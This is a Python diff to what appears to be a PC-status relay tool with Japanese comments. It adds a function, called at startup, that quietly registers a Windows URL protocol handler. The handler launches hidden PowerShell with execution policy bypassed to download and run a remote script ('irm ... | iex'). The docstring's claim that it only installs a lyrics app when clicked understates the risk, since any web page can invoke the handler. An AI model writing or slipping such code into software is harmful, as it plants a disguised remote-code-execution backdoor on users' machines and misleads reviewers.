@@ -291,6 +291,28 @@ def build_payload(config, override: StatusOverride, tracker: StatusTracker):
     return payload
 
 
+def register_lyrics_install_link():
+    """拡張機能の「インストール」から歌詞アプリを入れられるよう、決まった動きだけをするリンクを登録する。
+    リンクの中身はコマンドに渡さない。押されるまで何もインストールしない。"""
+    try:
+        import winreg
+
+        url = "https://raw.githubusercontent.com/skeliy/pc-status-relay/main/public/lyrics-install.ps1"
+        conhost = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "conhost.exe")
+        command = (
+            f'"{conhost}" --headless powershell.exe -NoProfile -NonInteractive '
+            f'-ExecutionPolicy Bypass -Command "irm {url} | iex"'
+        )
+        base = r"Software\Classes\lyricsoverlay-setup"
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, base) as key:
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Lyrics Overlay Setup")
+            winreg.SetValueEx(key, "URL Protocol", 0, winreg.REG_SZ, "")
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, base + r"\shell\open\command") as key:
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
+    except Exception as e:
+        print(f"[歌詞アプリ] インストール用のリンクを登録できませんでした: {e}")
+
+
 def start_music(config):
     """曲の共有機能を起動する。必要なファイルが無い・使えない環境では何もしない。"""
     if not config.get("music_enabled", True):
@@ -318,6 +340,7 @@ def start_music(config):
 def main_loop(config):
     override = StatusOverride()
     tracker = StatusTracker()
+    register_lyrics_install_link()
 
     for attempt in range(20):  # 再起動直後は古いプロセスがまだポートを使っていることがあるので少し粘る
         try:
